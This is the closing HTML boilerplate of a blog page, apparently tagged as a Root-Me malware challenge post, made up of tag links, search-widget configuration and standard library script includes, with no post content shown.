href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/hard/">hard</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script>
